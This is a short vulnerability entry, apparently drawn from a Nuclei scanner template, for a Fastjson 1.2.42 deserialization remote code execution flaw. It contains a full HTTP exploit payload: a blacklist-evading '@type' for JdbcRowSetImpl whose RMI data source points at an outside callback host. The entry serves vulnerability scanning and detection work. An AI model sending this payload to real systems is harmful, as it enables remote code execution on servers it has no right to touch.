# Vulnerability: Fastjson 1.2.42 - Remote Code Execution
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`fastjson-1-2-42-rce.yaml`)

## Description
Fastjson 1.2.42 is susceptible to a deserialization remote code execution vulnerability

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;",
   "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
   "autoCommit":true
}
```

